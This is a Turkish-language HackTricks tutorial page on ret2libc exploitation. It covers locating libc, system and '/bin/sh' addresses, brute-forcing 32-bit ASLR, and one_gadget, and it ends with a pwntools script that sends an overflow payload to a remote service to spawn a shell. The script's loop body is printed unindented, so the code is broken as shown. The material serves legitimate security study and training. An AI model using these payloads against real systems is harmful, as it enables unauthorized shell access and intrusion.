# Ret2lib

<details>

<summary><strong>Sıfırdan kahraman olmaya kadar AWS hackleme öğrenin</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

HackTricks'ı desteklemenin diğer yolları:

* **Şirketinizi HackTricks'te reklamını görmek istiyorsanız** veya **HackTricks'i PDF olarak indirmek istiyorsanız** [**ABONELİK PLANLARI**](https://github.com/sponsors/carlospolop)'na göz atın!
* [**Resmi PEASS & HackTricks ürünlerini**](https://peass.creator-spring.com) edinin
* [**PEASS Ailesi'ni**](https://opensea.io/collection/the-peass-family) keşfedin, özel [**NFT'lerimiz**](https://opensea.io/collection/the-peass-family) koleksiyonumuz
* **Katılın** 💬 [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) veya bizi **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**'da takip edin.**
* **Hacking püf noktalarınızı paylaşarak PR göndererek** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github depolarına katkıda bulunun.

</details>

## **Temel Bilgiler**

**Ret2Libc**'nin özü, zayıf bir programın yürütme akışını, saldırgan tarafından sağlanan shellcode'ın yığında yürütülmesi yerine, paylaşılan bir kütüphane içindeki bir işlev (örneğin, **system**, **execve**, **strcpy**) işlevine yönlendirmektir. Saldırgan, geri dönüş adresini değiştiren bir yük oluşturur ve yığında istenen kütüphane işlevine işaret edecek şekilde ayarlar, aynı zamanda çağrı konvansiyonuna göre gerekli argümanların da doğru şekilde ayarlanmasını sağlar.

### **Örnek Adımlar (basitleştirilmiş)**

* Çağrılacak işlevin adresini alın (örneğin, system) ve çağrılacak komutu (örneğin, /bin/sh)
* İlk argümanı komut dizinine işaret edecek şekilde ve yürütme akışını işleve geçirecek şekilde ROP zinciri oluşturun

## Adresleri Bulma

* Kullanılan `libc`'nin mevcut makineden olduğunu varsayarsak, nerede bellekte yükleneceğini aşağıdaki komutla bulabilirsiniz:

{% code overflow="wrap" %}
```bash
ldd /path/to/executable | grep libc.so.6 #Address (if ASLR, then this change every time)
```
{% endcode %}

Eğer ASLR'nin libc adresini değiştirip değiştirmediğini kontrol etmek istiyorsanız şunu yapabilirsiniz:
```bash
for i in `seq 0 20`; do ldd ./<bin> | grep libc; done
```
* Kullanılan libc bilindiğinde, `system` işlevine olan ofseti bulmak da mümkündür:
```bash
readelf -s /lib/i386-linux-gnu/libc.so.6 | grep system
```
* Kullanılan libc bilindiğinde, `/bin/sh` dizesinin işlevine olan ofseti bulmak da mümkündür:
```bash
strings -a -t x /lib/i386-linux-gnu/libc.so.6 | grep /bin/sh
```
### gdb-peda / GEF Kullanımı

Kullanılan libc bilindiğinde, Peda veya GEF kullanılarak **system** fonksiyonunun, **exit** fonksiyonunun ve **`/bin/sh`** dizesinin adresini elde etmek de mümkündür:
```
p system
p exit
find "/bin/sh"
```
### /proc/\<PID>/maps Kullanımı

Eğer işlem her konuştuğunuzda **çocuklar** oluşturuyorsa (ağ sunucusu) o dosyayı **okumayı** deneyin (muhtemelen root olmanız gerekecektir).

Burada işlem içinde **libc'nin tam olarak nerede yüklendiğini** ve işlemin her çocuğu için **nerede yükleneceğini** bulabilirsiniz.

![](<../../../../.gitbook/assets/image (95).png>)

Bu durumda **0xb75dc000** adresine yüklendi (Bu libc'nin taban adresi olacaktır)

## Bilinmeyen libc

Binary'nin yüklediği libc'yi **bilmediğiniz olabilir** (çünkü erişiminiz olmayan bir sunucuda olabilir). Bu durumda zafiyeti **sızdırmak için kullanabilir ve hangi libc** kütüphanesinin kullanıldığını bulabilirsiniz:

{% content-ref url="rop-leaking-libc-address/" %}
[rop-leaking-libc-address](rop-leaking-libc-address/)
{% endcontent-ref %}

Ve bunun için bir pwntools şablonu bulabilirsiniz:

{% content-ref url="rop-leaking-libc-address/rop-leaking-libc-template.md" %}
[rop-leaking-libc-template.md](rop-leaking-libc-address/rop-leaking-libc-template.md)
{% endcontent-ref %}

## 32 bit ASLR'yi Atlatma

Bu brute-force saldırıları **yalnızca 32 bit sistemler için** kullanışlıdır.

* Eğer saldırı yerel ise, libc'nin taban adresini brute-force etmeyi deneyebilirsiniz (32 bit sistemler için kullanışlıdır):
```python
for off in range(0xb7000000, 0xb8000000, 0x1000):
```
* Uzak bir sunucuya saldırırken, `libc` fonksiyonu `usleep` adresini **brute-force** yöntemiyle deneyebilirsiniz, örneğin 10'u argüman olarak geçirerek. Eğer sunucu cevap vermek için 10 saniye daha fazla zaman alıyorsa, bu fonksiyonun adresini buldunuz demektir.

## ONE\_GADGET

[**ONE\_GADGET**](https://github.com/david942j/one\_gadget), **system** ve **"/bin/sh"** kullanmak yerine kabuk elde etmeyi sağlar. **ONE\_GADGET**, sadece bir **ROP adresi** kullanarak kabuk elde etmek için libc kütüphanesinde bir yol bulacaktır.\
Ancak genellikle bazı kısıtlamalar vardır, en yaygın olanlarından ve kolayca kaçınılabilecek olanlarından biri `[rsp+0x30] == NULL` gibidir. **RSP** içindeki değerleri kontrol ettiğinizden, sadece daha fazla NULL değeri göndererek kısıtlamayı aşabilirsiniz.

![](<../../../../.gitbook/assets/image (615).png>)
```python
ONE_GADGET = libc.address + 0x4526a
rop2 = base + p64(ONE_GADGET) + "\x00"*100
```
## x86 Ret2lib Kod Örneği

Bu örnekte, kod içine ASLR brute-force entegre edilmiş ve zafiyetli ikili dosya uzak bir sunucuda bulunmaktadır:
```python
from pwn import *

c = remote('192.168.85.181',20002)
c.recvline()

for off in range(0xb7000000, 0xb8000000, 0x1000):
p = ""
p += p32(off + 0x0003cb20) #system
p += "CCCC" #GARBAGE, could be address of exit()
p += p32(off + 0x001388da) #/bin/sh
payload = 'A'*0x20010 + p
c.send(payload)
c.interactive()
```
## x64 Ret2lib Kod Örneği

Örneği kontrol et:

{% content-ref url="../rop-return-oriented-programing.md" %}
[rop-return-oriented-programing.md](../rop-return-oriented-programing.md)
{% endcontent-ref %}

## Ret-into-printf (veya puts)

Bu, `printf`/`puts`'ı belirli bir veri ile çağırarak işlemdeki bilgileri sızdırmaya olanak tanır.

## Ret2printf

Bu temelde, bir `printf` format dizesi açığına dönüştürmek için bir **Ret2lib'i kötüye kullanmak** anlamına gelir, `ret2lib`'i kullanarak değerleri kullanarak printf'i çağırmak ve bunu sömürmek için (anlamsız gibi görünse de mümkündür):

{% content-ref url="../../format-strings/" %}
[format-strings](../../format-strings/)
{% endcontent-ref %}

<details>

<summary><strong>Sıfırdan kahraman olmak için AWS hackleme öğrenin</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

HackTricks'i desteklemenin diğer yolları:

* **Şirketinizi HackTricks'te reklamını görmek istiyorsanız** veya **HackTricks'i PDF olarak indirmek istiyorsanız** [**ABONELİK PLANLARINI**](https://github.com/sponsors/carlospolop) kontrol edin!
* [**Resmi PEASS & HackTricks ürünlerini**](https://peass.creator-spring.com) edinin
* [**The PEASS Family'yi**](https://opensea.io/collection/the-peass-family) keşfedin, özel [**NFT'lerimiz**](https://opensea.io/collection/the-peass-family) koleksiyonumuz
* 💬 [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) **katılın** veya **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**'ı takip edin.**
* **Hacking hilelerinizi paylaşarak PR göndererek** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github depolarına katkıda bulunun.

</details>
